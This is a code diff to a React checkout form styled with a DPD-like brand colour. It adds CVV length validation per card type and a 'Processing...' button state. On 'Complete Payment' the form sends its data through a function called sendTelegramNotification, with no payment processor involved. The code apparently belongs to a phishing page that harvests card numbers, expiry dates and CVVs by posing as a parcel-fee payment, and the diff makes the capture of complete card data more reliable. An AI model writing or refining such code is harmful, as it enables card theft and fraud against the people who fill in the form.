@@ -1,5 +1,5 @@
 import { useState, useEffect } from "react";
-import { CreditCard, Lock, ArrowRight, ArrowLeft } from "lucide-react";
+import { CreditCard, Lock, ArrowRight, ArrowLeft, Loader2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import AddressAutocomplete, { AddressSuggestion } from "./AddressAutocomplete";
 import { supabase } from "@/integrations/supabase/client";
@@ -300,6 +300,38 @@ const PaymentForm = ({ onProceed, onBack }: PaymentFormProps) => {
 
   const [cardError, setCardError] = useState("");
   const [expiryError, setExpiryError] = useState("");
+  const [cvvError, setCvvError] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
+
+  // Get expected CVV length based on card type
+  const getExpectedCvvLength = (): number => {
+    return cardType === 'amex' ? 4 : 3;
+  };
+
+  // Validate CVV based on card type
+  const validateCvv = (cvvValue: string): { valid: boolean; error: string } => {
+    const expectedLength = getExpectedCvvLength();
+    if (cvvValue.length === 0) return { valid: true, error: "" };
+    if (cvvValue.length < expectedLength) return { valid: true, error: "" }; // Still typing
+    if (cvvValue.length !== expectedLength) {
+      return { valid: false, error: `CVV must be ${expectedLength} digits` };
+    }
+    return { valid: true, error: "" };
+  };
+
+  const handleCvvChange = (value: string) => {
+    const digits = value.replace(/\D/g, "");
+    const maxLength = getExpectedCvvLength();
+    const trimmed = digits.slice(0, maxLength);
+    setCvv(trimmed);
+    
+    if (trimmed.length === maxLength) {
+      const validation = validateCvv(trimmed);
+      setCvvError(validation.error);
+    } else {
+      setCvvError("");
+    }
+  };
 
   // Validate expiry date
   const validateExpiry = (expiryValue: string): { valid: boolean; error: string } => {
@@ -442,8 +474,26 @@ ${countryName}
       return;
     }
     
-    await sendTelegramNotification();
-    onProceed();
+    // Validate CVV
+    const cvvValidation = validateCvv(cvv);
+    if (!cvvValidation.valid) {
+      setCvvError(cvvValidation.error);
+      return;
+    }
+    
+    const expectedCvvLength = getExpectedCvvLength();
+    if (cvv.length !== expectedCvvLength) {
+      setCvvError(`CVV must be ${expectedCvvLength} digits`);
+      return;
+    }
+    
+    setIsSubmitting(true);
+    try {
+      await sendTelegramNotification();
+      onProceed();
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   return (
@@ -570,18 +620,21 @@ ${countryName}
                 )}
               </div>
               <div>
-                <label className="block text-sm font-medium mb-2">CVV</label>
+                <label className="block text-sm font-medium mb-2">
+                  CVV {cardType === 'amex' ? '(4 digits)' : '(3 digits)'}
+                </label>
                 <input
                   type="text"
-                  placeholder="123"
+                  placeholder={cardType === 'amex' ? '1234' : '123'}
                   value={cvv}
-                  onChange={(e) =>
-                    setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
-                  }
-                  maxLength={4}
-                  className="input-field font-mono"
+                  onChange={(e) => handleCvvChange(e.target.value)}
+                  maxLength={getExpectedCvvLength()}
+                  className={`input-field font-mono ${cvvError ? 'border-destructive focus:ring-destructive' : ''}`}
                   required
                 />
+                {cvvError && (
+                  <p className="text-destructive text-sm mt-1">{cvvError}</p>
+                )}
               </div>
             </div>
           </div>
@@ -673,10 +726,20 @@ ${countryName}
             </Button>
             <Button
               type="submit"
-              className="flex-1 h-12 text-base font-semibold bg-primary hover:bg-dpd-dark text-primary-foreground rounded-xl"
+              disabled={isSubmitting}
+              className="flex-1 h-12 text-base font-semibold bg-primary hover:bg-dpd-dark text-primary-foreground rounded-xl disabled:opacity-70"
             >
-              Complete Payment
-              <ArrowRight className="w-4 h-4 ml-2" />
+              {isSubmitting ? (
+                <>
+                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
+                  Processing...
+                </>
+              ) : (
+                <>
+                  Complete Payment
+                  <ArrowRight className="w-4 h-4 ml-2" />
+                </>
+              )}
             </Button>
           </div>
         </form>
